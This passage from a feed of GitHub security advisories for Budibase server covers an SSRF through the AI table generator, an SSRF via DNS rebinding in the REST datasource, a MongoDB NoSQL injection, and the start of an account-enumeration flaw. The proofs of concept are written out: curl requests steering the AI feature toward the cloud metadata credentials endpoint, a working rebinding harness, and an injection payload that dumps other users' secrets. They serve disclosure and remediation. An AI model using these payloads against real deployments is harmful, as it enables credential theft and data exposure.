<pre><code class="language-typescript">// packages/server/src/sdk/workspace/ai/helpers/rows.ts:34
        await processAttachments(entry, attachmentColumns)
</code></pre>
<h3 id="compare-with-correct-sibling-processurlfile-in-extractts">Compare with correct sibling: processUrlFile() in extract.ts</h3>
<pre><code class="language-typescript">// packages/server/src/automations/steps/ai/extract.ts:139-144
async function processUrlFile(
  fileUrl: string,
  fileType: SupportedFileType,
  llm: LLMResponse
): Promise&lt;ExtractInput&gt; {
  const response = await fetchWithBlacklist(fileUrl)  // Correct: uses blacklist
</code></pre>
<p>The <code>fetchWithBlacklist()</code> function validates each URL (including redirects) against a blacklist of internal/private IP ranges before making the request:</p>
<pre><code class="language-typescript">// packages/server/src/automations/steps/utils.ts:100-112
export async function fetchWithBlacklist(
  url: string,
  request: RequestInit = {}
): Promise&lt;Response&gt; {
  const maxRedirects = 5
  let nextUrl = url
  // ...
  for (let redirects = 0; redirects &lt;= maxRedirects; redirects++) {
    await throwIfBlacklisted(nextUrl)  // Validates against private IP ranges
    const response = await fetch(nextUrl, nextRequest)
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Prerequisites: Builder-level authentication, AI feature enabled on the instance.</p>
<pre><code class="language-bash"># Step 1: Authenticate as builder
TOKEN=$(curl -s -X POST 'http://TARGET:10000/api/global/auth/default/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"builder@example.com","password":"password123"}' \
  -c - | grep budibase:auth | awk '{print $NF}')

# Step 2: Create an app with a table that has an attachment column
APP_ID="app_dev_xxxx"  # Use existing app

# Step 3: Use the AI table generation endpoint with a prompt designed to
# produce internal URLs as attachment values.
# The LLM will generate rows with attachment column values pointing to
# internal services.
curl -X POST "http://TARGET:10000/api/workspace/$APP_ID/ai/tables/generate" \
  -H "Content-Type: application/json" \
  -H "Cookie: budibase:auth=$TOKEN" \
  -d '{
    "prompt": "Create a table called Assets with columns: name (string), logo (attachment). Add one row: name=test, logo=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }'

# The server will call uploadUrl("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
# which fetches the cloud metadata endpoint without any SSRF protection.
# The response content is saved to object storage and a URL is returned in the row data.

# Step 4: Read the created row to exfiltrate the metadata response
curl -X GET "http://TARGET:10000/api/$APP_ID/rows?tableId=&lt;table_id&gt;" \
  -H "Cookie: budibase:auth=$TOKEN"
# The attachment URL in the response points to the saved metadata content
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li>Attacker with builder access can read cloud instance metadata (AWS IAM credentials, GCP service account tokens)</li>
<li>Internal service enumeration and data exfiltration from private network resources</li>
<li>Port scanning of internal infrastructure via timing/error differences</li>
<li>Bypass of network segmentation when Budibase is deployed in a DMZ or VPC</li>
</ul>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<p>Replace the bare <code>fetch()</code> in <code>uploadUrl()</code> with <code>fetchWithBlacklist()</code>:</p>
<pre><code class="language-typescript">// packages/server/src/utilities/fileUtils.ts
import fs from "fs"
-import fetch from "node-fetch"
import path from "path"
import { pipeline } from "stream"
import { promisify } from "util"
import * as uuid from "uuid"

import { context, objectStore } from "@budibase/backend-core"
import { Upload } from "@budibase/types"
import { ObjectStoreBuckets } from "../constants"
+import { fetchWithBlacklist } from "../automations/steps/utils"

// ...

export async function uploadUrl(url: string): Promise&lt;Upload | undefined&gt; {
  try {
-    const res = await fetch(url)
+    const res = await fetchWithBlacklist(url)

    const extension = [...res.url.split(".")].pop()!.split("?")[0]
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-hfhx-w8p8-4hc7">https://github.com/Budibase/budibase/security/advisories/GHSA-hfhx-w8p8-4hc7</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/18866">https://github.com/Budibase/budibase/pull/18866</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/72e602d68daeebe3b95b0ed87acd351a38e327d7">https://github.com/Budibase/budibase/commit/72e602d68daeebe3b95b0ed87acd351a38e327d7</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.4">https://github.com/Budibase/budibase/releases/tag/3.39.4</a></li>
<li><a href="https://github.com/advisories/GHSA-hfhx-w8p8-4hc7">https://github.com/advisories/GHSA-hfhx-w8p8-4hc7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfhx-w8p8-4hc7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T21:44:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server] Budibase: SSRF via DNS rebinding in the REST datasource integration]]></title>
        <id>https://github.com/advisories/GHSA-v42f-v8xc-j435</id>
        <link href="https://github.com/advisories/GHSA-v42f-v8xc-j435"/>
        <updated>2026-07-24T21:44:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Budibase's central outbound-fetch guard (<code>fetchWithBlacklist</code>) prevents SSRF/DNS-rebinding by resolving the target hostname, checking every resolved IP against the blacklist, and <strong>pinning</strong> the connection to the validated IP. The pin is implemented as a Node <code>http(s).Agent</code> (<code>makePinnedAgent</code>). The fix for CVE-2026-54353 relies on this pin to stop DNS rebinding.</p>
<p>The REST datasource integration (<code>@budibase/server</code>) calls <code>fetchWithBlacklist</code> but performs the actual request with <strong>undici</strong>'s <code>fetch</code>. undici does not support the Node <code>agent</code> option — it is silently ignored — and instead uses its own <code>dispatcher</code>, which re-resolves the hostname's DNS at connection time. As a result, <strong>the validated/pinned IP is never used on the REST datasource path</strong>, and the DNS-rebinding protection that CVE-2026-54353 added is silently defeated for the single most-used outbound path in Budibase.</p>
<p>An authenticated user who can configure/run a REST datasource (e.g. a builder/tenant) can use a rebinding hostname (public IP during validation, internal IP at connect) to make the server issue arbitrary, full-response HTTP requests to internal-only services — cloud metadata (IAM credential theft), the internal CouchDB/Redis/MinIO, and other internal endpoints — reading and, because REST datasources allow arbitrary method/body, writing or destroying internal data.</p>
<h3 id="details">Details</h3>
<p><strong>The guard pins the validated IP via a Node agent</strong> — <code>packages/backend-core/src/utils/outboundFetch.ts</code>:</p>
<ul>
<li><code>resolveSafePinnedIp(url)</code> resolves the hostname and checks every address against <code>isBlacklisted</code>, returning a single <code>pinnedIp</code> (lines ~39–53).</li>
<li><code>makePinnedAgent(url, ip)</code> builds a <strong>Node</strong> <code>http.Agent</code>/<code>https.Agent</code> whose <code>lookup</code> always returns <code>pinnedIp</code>, so a node-fetch connection can only reach the validated IP (lines ~55–68).</li>
<li><code>fetchWithBlacklist</code> passes that agent into the request: <code>fetchFn(nextUrl, { ...nextRequest, agent: makePinnedAgent(nextUrl, pinnedIp) })</code> (lines ~186–192). Each redirect hop is re-validated and re-pinned in the loop.</li>
</ul>
<p><strong>The REST integration overrides the transport with undici, which ignores <code>agent</code></strong> — <code>packages/server/src/integrations/rest.ts</code>:</p>
<ul>
<li><code>fetch</code> is imported from <strong><code>undici</code></strong> (top-of-file import block, ~line 30).</li>
<li>The request is made by overriding <code>fetchFn</code> (lines ~767–793):<pre><code class="language-ts">const setDispatcher = (requestInput, requestUrl) =&gt; ({
  ...requestInput,
  dispatcher: getDispatcher({ rejectUnauthorized, url: requestUrl }),
})
...
response = await coreUtils.fetchWithBlacklist(url, input, {
  fetchFn: async (requestUrl, requestInput) =&gt;
    fetch(requestUrl, setDispatcher(requestInput, requestUrl)), // undici.fetch
})
</code></pre>
The options object reaching <code>undici.fetch</code> is <code>{ ...nextRequest, agent: &lt;pinned Node Agent&gt;, dispatcher: &lt;getDispatcher result&gt; }</code>. <strong>undici uses <code>dispatcher</code> and ignores <code>agent</code>.</strong></li>
</ul>
<p><strong>The dispatcher does no IP pinning</strong> — <code>packages/backend-core/src/utils/fetch.ts</code>:</p>
<ul>
<li><code>getDispatcher</code> → <code>createDispatcher</code> → (no proxy env) → <code>createDirectAgent</code> = <code>new Agent({ connect: { rejectUnauthorized } })</code> (lines ~109–114, ~161–172, ~183). This is a plain undici <code>Agent</code> with <strong>no <code>connect.lookup</code> / no pin</strong>, so undici resolves the hostname's DNS itself at connect time.</li>
</ul>
<p><strong>Net effect (TOCTOU / DNS rebinding):</strong> <code>fetchWithBlacklist</code> validates the hostname → safe public IP and builds a pinned Node agent; the REST path then connects via undici, which re-resolves the same hostname independently. With a rebinding domain (TTL 0: public IP during validation, <code>127.0.0.1</code> / <code>169.254.169.254</code> / internal IP at connect), the request lands on an internal service — exactly the gap CVE-2026-54353's pin was meant to close.</p>
<p><strong>Scope of impact / why it's REST-specific:</strong> <code>rest.ts</code> is the only caller that overrides <code>fetchFn</code> with undici. All other outbound sinks (automation <code>outgoingWebhook</code>/<code>n8n</code>/<code>make</code>/<code>zapier</code>/<code>discord</code>/<code>slack</code>, and AI-extract's <code>processUrlFile</code>) use the default node-fetch-based <code>fetchWithBlacklist</code>, which <strong>does</strong> honor the pinned agent and is <strong>not</strong> affected. REST datasource queries are the most common outbound path, and the response body is returned to the caller (full-response SSRF, not blind).</p>
<h3 id="poc">PoC</h3>
<p>The PoC drives the <strong>real, unmodified</strong> guard code (<code>outboundFetch.ts</code> + <code>fetch.ts</code>, copied verbatim — sha256 verified) and reproduces the exact <code>rest.ts</code> call pattern. Only the <code>../blacklist</code> module is stubbed to model the rebinding <strong>input</strong> (validation observes a safe public IP). Requires Node 18+.</p>
<pre><code class="language-bash"># prerequisite: a Budibase checkout; set BB to its path
export BB=/path/to/budibase
mkdir ssrf-poc &amp;&amp; cd ssrf-poc
SRC="$BB/packages/backend-core/src"

# 1) Copy the REAL guard code, verbatim (sha proves no edits)
mkdir -p real/utils real/blacklist
cp "$SRC/utils/outboundFetch.ts" real/utils/
cp "$SRC/utils/fetch.ts"         real/utils/

# 2) Scenario stub = the rebinding INPUT: validation sees a safe, non-blacklisted public IP
cat &gt; real/blacklist/index.ts &lt;&lt;'EOF'
const SAFE = "203.0.113.10" // RFC5737 TEST-NET-3, not blacklisted -&gt; validation passes
export async function resolveAddress(_a: string): Promise&lt;string[]&gt; { return [SAFE] }
export async function isBlacklisted(a: string): Promise&lt;boolean&gt; { return a !== SAFE }
EOF

# 3) Harness = REAL fetchWithBlacklist + REAL getDispatcher, exact rest.ts pattern
cat &gt; entry.ts &lt;&lt;'EOF'
import http from "http"
import { fetch as undiciFetch } from "undici"
import { fetchWithBlacklist } from "./real/utils/outboundFetch" // REAL guard
import { getDispatcher } from "./real/utils/fetch"              // REAL dispatcher
async function main() {
  const server = http.createServer((_q, r) =&gt; r.end("INTERNAL_SECRET_RESPONSE"))
  await new Promise&lt;void&gt;(r =&gt; server.listen(0, "127.0.0.1", r))
  const port = (server.address() as any).port
  const target = `http://localhost:${port}/` // OS resolves localhost -&gt; 127.0.0.1 at connect
  console.log(`[*] internal service 127.0.0.1:${port}; guard validates host -&gt; 203.0.113.10 (safe), pins to it`)

  // (A) REST datasource path: undici fetch + real getDispatcher (exactly rest.ts).
  const restFetchFn = (u: string, i: any) =&gt;
    undiciFetch(u, { ...i, dispatcher: getDispatcher({ url: u, rejectUnauthorized: true }) as any }) as any
  let A: string
  try { const r: any = await fetchWithBlacklist(target, { method: "GET" } as any, { fetchFn: restFetchFn }); A = `status ${r.status} body=${await r.text()}` }
  catch (e: any) { A = `ERROR ${e.message}` }
  console.log("(A) REST/undici path  -&gt;", A)

  // (B) Negative control: default fetchFn (node-fetch) honors the pinned agent.
  let B: string
  try { const r: any = await fetchWithBlacklist(target, { method: "GET", timeout: 3000 } as any); B = `status ${r.status} body=${await r.text()}` }
  catch (e: any) { B = `ERROR ${e.message}` }
  console.log("(B) node-fetch path   -&gt;", B)

  const bypass = A.includes("INTERNAL_SECRET_RESPONSE"), contained = !B.includes("INTERNAL_SECRET_RESPONSE")
  console.log(`\nRESULT: ${bypass &amp;&amp; contained ? "PASS - undici path BYPASSES guard, node-fetch path CONTAINED" : "FAIL"}`)
  server.close(); process.exit(bypass &amp;&amp; contained ? 0 : 1)
}
main()
EOF

# 4) Deps, bundle, run
npm init -y &gt;/dev/null 2&gt;&amp;1
npm install undici@6 node-fetch@2 esbuild
npx esbuild entry.ts --bundle --platform=node --format=cjs --outfile=entry.cjs
node entry.cjs
</code></pre>
<p><strong>Expected output</strong> (the port is the only variable):</p>
<pre><code>[*] internal service 127.0.0.1:&lt;random&gt;; guard validates host -&gt; 203.0.113.10 (safe), pins to it
(A) REST/undici path  -&gt; status 200 body=INTERNAL_SECRET_RESPONSE
(B) node-fetch path   -&gt; ERROR Failed to connect to resolved IP for localhost: network timeout at: http://localhost:&lt;random&gt;/

RESULT: PASS - undici path BYPASSES guard, node-fetch path CONTAINED
</code></pre>
<p><strong>How to read it:</strong></p>
<ul>
<li><strong>(A)</strong> the real <code>fetchWithBlacklist</code> validated and pinned the safe public IP <code>203.0.113.10</code>, yet the undici REST transport re-resolved <code>localhost</code> and reached <code>127.0.0.1</code> — the internal service responded → <strong>SSRF bypass</strong>.</li>
<li><strong>(B)</strong> the default node-fetch path honored the pin (forced to the unroutable <code>203.0.113.10</code>) and never reached the internal service. The <code>"Failed to connect to resolved IP for localhost"</code> string is emitted by the real <code>outboundFetch.ts</code>, proving the pin works there. This is the negative control localizing the bug to the undici transport.</li>
</ul>
<p><strong>Real-world variant:</strong> instead of <code>localhost</code>, an attacker uses a domain they control with a 0-second TTL that returns a public IP during the guard's validation lookup and an internal IP (<code>169.254.169.254</code>, <code>127.0.0.1</code>, internal CouchDB/Redis) at undici's connect-time lookup; the REST datasource query then returns the internal response body to the attacker.</p>
<h3 id="impact">Impact</h3>
<p><strong>Type:</strong> Server-Side Request Forgery via DNS rebinding (CWE-918 + CWE-367), full-response and with arbitrary HTTP method/body (REST datasources let the caller choose method, headers, and body).</p>
<p><strong>Who is impacted:</strong> Any Budibase deployment on an affected version, especially multi-tenant / Budibase-Cloud-style hosting where builders/tenants are not trusted with host-internal access. The SSRF blacklist is the control that contains those users; this bypass defeats it.</p>
<p><strong>Realistic worst case:</strong> An authenticated builder/tenant points a REST datasource at a rebinding host and makes the server:</p>
<ul>
<li>read cloud metadata (<code>http://169.254.169.254/...</code>) → steal IAM credentials → <strong>cloud account compromise</strong>;</li>
<li>read the internal CouchDB (<code>http://127.0.0.1:5984/_all_dbs</code>, <code>_users</code>) → <strong>all tenants' apps, users, and secrets</strong>;</li>
<li>using <code>PUT</code>/<code>POST</code>/<code>DELETE</code> against unauthenticated localhost services → create admin documents, modify or <strong>delete</strong> tenant databases / flush caches → integrity and availability loss for all co-tenants.</li>
</ul>
<h3 id="cvss-31-vector-justification">CVSS 3.1 Vector Justification</h3>
<table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
<th>Why</th>
</tr>
</thead>
<tbody><tr>
<td>Attack Vector (AV)</td>
<td>Network (N)</td>
<td>Triggered through Budibase's HTTP API / app (a REST datasource query).</td>
</tr>
<tr>
<td>Attack Complexity (AC)</td>
<td>High (H)</td>
<td>Requires DNS rebinding — the validation-time IP must differ from the connect-time IP (TOCTOU). A direct internal request without rebinding is blocked by the blacklist, so the race is mandatory.</td>
</tr>
<tr>
<td>Privileges Required (PR)</td>
<td>Low (L)</td>
<td>Requires an authenticated account that can configure/run a REST datasource (builder/tenant).</td>
</tr>
<tr>
<td>User Interaction (UI)</td>
<td>None (N)</td>
<td>The attacker configures and triggers the request; no victim interaction.</td>
</tr>
<tr>
<td>Scope (S)</td>
<td>Changed (C)</td>
<td>Canonical SSRF: the vulnerable component is abused to reach resources in other security authorities (cloud metadata, internal CouchDB/Redis/MinIO).</td>
</tr>
<tr>
<td>Confidentiality (C)</td>
<td>High (H)</td>
<td>Full-response SSRF: read cloud IAM credentials and the internal CouchDB (every tenant's apps, users, secrets).</td>
</tr>
<tr>
<td>Integrity (I)</td>
<td>High (H)</td>
<td>Arbitrary method/body allows <code>PUT</code>/<code>POST</code>/<code>DELETE</code> to unauthenticated localhost services (CouchDB <code>:5984</code>) → create admin docs, modify tenant data.</td>
</tr>
<tr>
<td>Availability (A)</td>
<td>High (H)</td>
<td>The same write primitive can <code>DELETE</code> databases / flush Redis → full data/service loss for all tenants.</td>
</tr>
</tbody></table>
<p><strong>Notes:</strong> AC:H is the standard, defensible scoring for DNS rebinding; if rebinding is treated as reliable (TTL-0 frameworks), <code>AC:L</code> yields <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</code>. A conservative read-only interpretation  is <code>I:N/A:N</code>.</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<p>Make the transport that actually performs the request honor the validated IP. In <code>getDispatcher</code>/<code>rest.ts</code>, construct the undici <code>Agent</code> with a <code>connect: { lookup }</code> (or custom <code>connect</code>) that returns <strong>only</strong> the <code>pinnedIp</code> resolved by <code>fetchWithBlacklist</code> (i.e., mirror <code>makePinnedAgent</code> for undici), so the dispatcher cannot re-resolve DNS; alternatively, re-check the resolved peer IP against <code>isBlacklisted</code> inside the undici <code>connect</code> callback. The Node-<code>agent</code> pin must not be relied upon when the request is issued through undici.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-v42f-v8xc-j435">https://github.com/Budibase/budibase/security/advisories/GHSA-v42f-v8xc-j435</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/19178">https://github.com/Budibase/budibase/pull/19178</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/1fecb3fc3497e8db7b60b42cc514ce304ffe3a41">https://github.com/Budibase/budibase/commit/1fecb3fc3497e8db7b60b42cc514ce304ffe3a41</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/5758bdb242802ca20c4ed0dc579e4330ee898ef3">https://github.com/Budibase/budibase/commit/5758bdb242802ca20c4ed0dc579e4330ee898ef3</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/586802b5706367520d14245e18a7d0cabab0be11">https://github.com/Budibase/budibase/commit/586802b5706367520d14245e18a7d0cabab0be11</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.30">https://github.com/Budibase/budibase/releases/tag/3.39.30</a></li>
<li><a href="https://github.com/advisories/GHSA-v42f-v8xc-j435">https://github.com/advisories/GHSA-v42f-v8xc-j435</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v42f-v8xc-j435</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:44:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: NoSQL injection in MongoDB integration: collection dump, $where JS exec, cross-collection pivot, arbitrary update/delete]]></title>
        <id>https://github.com/advisories/GHSA-pmpg-2mxq-6xwr</id>
        <link href="https://github.com/advisories/GHSA-pmpg-2mxq-6xwr"/>
        <updated>2026-07-24T21:43:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An end-user injection in Budibase's MongoDB datasource lets any BASIC app user bypass the builder's query-level access controls. Builders scope MongoDB reads per-user with bindings like <code>{"email": "{{ currentUser.email }}"}</code> so each app user only sees their own rows. Because the binding is handlebars-enriched into the query JSON with <code>noEscaping: true</code> and then <code>JSON.parse</code>d, Bob (a BASIC user) overrides the builder's filter with a MongoDB operator and reads every document the connection can touch. SQL datasources are parameterized through <code>interpolateSQL()</code>; the MongoDB path has no equivalent, so the scoping pattern Budibase's own docs show is unsafe.</p>
<h2 id="details">Details</h2>
<h3 id="enrichment">Enrichment</h3>
<p><code>packages/server/src/sdk/workspace/queries/queries.ts:105-125</code> enriches every string field of the query with handlebars, then parses the enriched <code>json</code> field:</p>
<pre><code class="language-typescript">enrichedQuery[key] = processStringSync(fields[key], parameters, {
  noEscaping: true,
  noHelpers: true,
  escapeNewlines: true,
})
// ...
enrichedQuery.json = JSON.parse(
  enrichedQuery.json || enrichedQuery.customData || enrichedQuery.requestBody
)
</code></pre>
<p><code>noEscaping: true</code> turns <code>{{name}}</code> into <code>{{{name}}}</code>, which Handlebars renders without HTML-escaping. Any <code>"</code> or <code>}</code> the attacker supplies lands verbatim in the enriched string. <code>JSON.parse</code> then produces a structured object whose top-level keys and operators came from the parameter value.</p>
<h3 id="execution">Execution</h3>
<p><code>packages/server/src/integrations/mongodb.ts:499-512</code>:</p>
<pre><code class="language-typescript">async read(query: MongoDBQuery) {
  try {
    await this.connect()
    const db = this.client.db(this.config.db)
    const collection = db.collection(query.extra.collection)
    let json = this.createObjectIds(query.json)
    switch (query.extra.actionType) {
      case "find": {
        if (json) {
          return await collection.find(json).toArray()
        }
</code></pre>
<p><code>createObjectIds</code> walks the object and rewrites strings that look like <code>ObjectId(...)</code>. It does not strip <code>$</code>-prefixed keys and does not reject operator-shaped values. The injected filter reaches <code>collection.find</code> unchanged.</p>
<p>For comparison, SQL datasources go through <code>interpolateSQL</code> at <code>packages/server/src/threads/query.ts:145</code>, which parameterizes bindings into driver-level bind variables. The MongoDB path has no equivalent.</p>
<h3 id="duplicate-key-trick">Duplicate-key trick</h3>
<p>The template gives the attacker one substitution point inside the <code>name</code> value. The outer <code>{"name": "</code> / <code>"}</code> is fixed. The attacker's payload:</p>
<pre><code>x", "name": {"$ne": "x"}, "$comment": "bud-033
</code></pre>
<p>Renders to:</p>
<pre><code class="language-json">{"name": "x", "name": {"$ne": "x"}, "$comment": "bud-033"}
</code></pre>
<p><code>JSON.parse</code> keeps the last value for a duplicate key (ECMA-404 leaves this implementation-defined; V8 and Node's <code>JSON.parse</code> keep the last), so the parsed object is:</p>
<pre><code class="language-js">{ name: { $ne: "x" }, $comment: "bud-033" }
</code></pre>
<p><code>$comment</code> is a MongoDB meta operator that the server accepts and ignores, so it consumes the template's trailing <code>"}</code> without restricting the query. The filter that reaches MongoDB is <code>name != "x"</code>, which matches every document.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Tested against Budibase 3.35.8 (master at f960e361) and MongoDB 6.</p>
<p>Step 1: Admin creates a MongoDB datasource and seeds three documents:</p>
<pre><code class="language-bash">docker run -d --name mongo -p 27017:27017 mongo:6
docker exec mongo mongosh --quiet --eval '
  db = db.getSiblingDB("testdb");
  db.users.insertMany([
    {name:"alice", email:"alice@x.com", secret:"public-alice"},
    {name:"bob",   email:"bob@x.com",   secret:"PRIVATE-BOB"},
    {name:"eve",   email:"eve@x.com",   secret:"PRIVATE-EVE"}
  ]);'
</code></pre>
<p>Step 2: Alice, a builder, configures the datasource and writes a MongoDB query <code>find-by-name</code> whose <code>json</code> field is <code>{"name": "{{name}}"}</code>. She publishes the app and grants Bob (BASIC) a role on it.</p>
<p>Step 3: Bob, logged in as BASIC with a role on the published app, executes the query via the standard execute endpoint. <code>POST /api/queries/:queryId</code> is reachable by any app role with permission on the query (it is how Budibase renders query-backed tables to end users):</p>
<pre><code class="language-bash">curl -sS -b "$BOB_COOKIE" -X POST "$BASE/api/queries/$QUERY_ID" \
  -H "Content-Type: application/json" -H "x-budibase-app-id: $PROD_APP" \
  -d '{"parameters":{"name":"x\", \"name\": {\"$ne\": \"x\"}, \"$comment\": \"bud-033"}}'
</code></pre>
<p>Legitimate <code>name=alice</code> returned only Alice:</p>
<pre><code class="language-json">[{"_id":"...","name":"alice","email":"alice@x.com","secret":"public-alice"}]
</code></pre>
<p>The injection payload returned all three documents:</p>
<pre><code class="language-json">[
  {"_id":"...","name":"alice","email":"alice@x.com","secret":"public-alice"},
  {"_id":"...","name":"bob",  "email":"bob@x.com",  "secret":"PRIVATE-BOB"},
  {"_id":"...","name":"eve",  "email":"eve@x.com",  "secret":"PRIVATE-EVE"}
]
</code></pre>
<p>MongoDB's profiling confirmed the filter that reached the server:</p>
<pre><code class="language-json">{"find":"users","filter":{"name":{"$ne":"never-matches"},"$comment":"bud-033"}}
</code></pre>
<h2 id="impact">Impact</h2>
<p>The builder's per-user filter collapses. A BASIC end-user who is only meant to read their own documents reads everyone's.</p>
<p>Concrete scenario: builder publishes an app whose "My records" screen runs a MongoDB query with <code>json</code> = <code>{"email": "{{ currentUser.email }}"}</code>. Each app user is supposed to see only the rows where <code>email</code> matches their session. Bob, a BASIC user in that app, sends <code>bob@x.com", "email": {"$ne": "x"}, "$comment": "x</code> as the <code>currentUser.email</code> binding replacement and receives every row in the collection, including other tenants' users, admin records, and any secret fields the builder stored alongside.</p>
<p>The blast radius depends on what the builder exposed:</p>
<ul>
<li><strong>Read queries</strong>: full-collection dump (demonstrated above: three docs returned where the scoped filter returned one, including other users' secrets).</li>
<li><strong><code>$where</code> operator</strong>: arbitrary JavaScript inside the MongoDB server process. The attacker exfiltrates any field of any document through the JS expression or via timing side channels.</li>
<li><strong><code>$function</code> / <code>$accumulator</code></strong> (MongoDB 4.4+): arbitrary JS in aggregation stages.</li>
<li><strong><code>$lookup</code></strong>: cross-collection joins within the same database. If the MongoDB datasource holds admin tokens or sensitive collections next to the one the builder queried, the injection reaches them.</li>
<li><strong><code>update</code> / <code>delete</code> action types</strong>: the filter injection rewrites the affected-document set. One request wipes or rewrites every document the connection can reach.</li>
</ul>
<p>The blast radius is the builder's own MongoDB deployment, not Budibase infrastructure. Budibase does not ship or run MongoDB; this connector talks to the customer's external Mongo, so the attacker reads and writes data the builder's connection has access to and does not cross into Budibase's tenant boundary, CouchDB, MinIO, or Redis. The vulnerable pattern (<code>{{binding}}</code> inside the JSON body) is the exact shape Budibase's documentation shows for parameterized MongoDB queries, and there is no in-product warning that MongoDB behaves differently from SQL. CVSS reflects the common read-query scope (filter bypass on a single collection); the <code>$where</code> / <code>$lookup</code> / write-action paths exist but depend on what primitives the builder exposed.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Strip <code>$</code>-prefixed keys from any object that originates from user-controlled parameters before it reaches <code>collection.find</code>/<code>updateOne</code>/<code>deleteOne</code>. A single guard in <code>createObjectIds</code> covers the read, update, and delete paths:</p>
<pre><code class="language-typescript">// packages/server/src/integrations/mongodb.ts:394 (createObjectIds)
const DANGEROUS = new Set([
  "$where", "$function", "$accumulator",
  "$expr", "$regex", "$ne", "$nin", "$gt", "$gte", "$lt", "$lte",
  "$or", "$and", "$nor", "$not", "$exists", "$type", "$mod",
  "$text", "$comment",
])

function stripOperators(obj: any): any {
  if (obj === null || typeof obj !== "object") return obj
  if (Array.isArray(obj)) return obj.map(stripOperators)
  const cleaned: Record&lt;string, any&gt; = {}
  for (const [k, v] of Object.entries(obj)) {
    if (DANGEROUS.has(k)) continue
    cleaned[k] = stripOperators(v)
  }
  return cleaned
}
</code></pre>
<p>A safer fix mirrors the SQL path: introduce a MongoDB-aware enrichment that binds parameters as values instead of string-substituting them into the query JSON. That eliminates the whole class.</p>
<hr>
<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-pmpg-2mxq-6xwr">https://github.com/Budibase/budibase/security/advisories/GHSA-pmpg-2mxq-6xwr</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/18907">https://github.com/Budibase/budibase/pull/18907</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/dd8c0654b35cd89ce3645f2355f4bf2ff9a5dd80">https://github.com/Budibase/budibase/commit/dd8c0654b35cd89ce3645f2355f4bf2ff9a5dd80</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.9">https://github.com/Budibase/budibase/releases/tag/3.39.9</a></li>
<li><a href="https://github.com/advisories/GHSA-pmpg-2mxq-6xwr">https://github.com/advisories/GHSA-pmpg-2mxq-6xwr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmpg-2mxq-6xwr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:43:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server]  Budibase: Account Enumeration via Login Lockout Response Differential]]></title>
        <id>https://github.com/advisories/GHSA-cr7p-cr3q-h5cm</id>
        <link href="https://github.com/advisories/GHSA-cr7p-cr3q-h5cm"/>
        <updated>2026-07-24T21:43:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The login lockout mechanism in Budibase creates an observable response discrepancy that allows unauthenticated attackers to enumerate valid email addresses. When an existing user's account is locked after 5 failed login attempts, the server returns a distinct <code>403</code> response with <code>X-Account-Locked: 1</code> and <code>Retry-After: 900</code> headers plus the message "Account temporarily locked." For non-existing users, the response is always a generic <code>403 "Unauthorized"</code> regardless of attempt count, because the lockout counter is never incremented.</p>
<h2 id="details">Details</h2>
<p>The vulnerability exists in two files that implement the login lockout feature:</p>
<p><strong><code>packages/worker/src/middleware/lockout.ts:18-36</code></strong> — The lockout middleware only blocks requests for users that exist in the database AND are locked:</p>
<pre><code class="language-typescript">export default async (ctx: Ctx, next: Next) =&gt; {
  const email = ctx.request.body.username
  if (!email) {
    return await next()
  }
  const dbUser = await userSdk.db.getUserByEmail(email)
  if (dbUser &amp;&amp; (await isLocked(email))) {  // line 26: non-existing users skip this entirely
    ctx.set("X-Account-Locked", "1")
    ctx.set("Retry-After", String(env.LOGIN_LOCKOUT_SECONDS))
    ctx.throw(403, "Account temporarily locked. Try again later.")
  }
  return await next()
}
</code></pre>
<p><strong><code>packages/worker/src/api/controllers/global/auth.ts:127-141</code></strong> — The login handler only increments the failure counter for existing users:</p>
<pre><code class="language-typescript">if (err || !user) {
  if (dbUser) {          // line 129: non-existing users never trigger onFailed()
    await onFailed(email)
  }
  if (await isLocked(email)) {
    return handleLockoutResponse(ctx, email)
  }
  // ...
  return passportCallback(ctx, user as any, err, info)
}
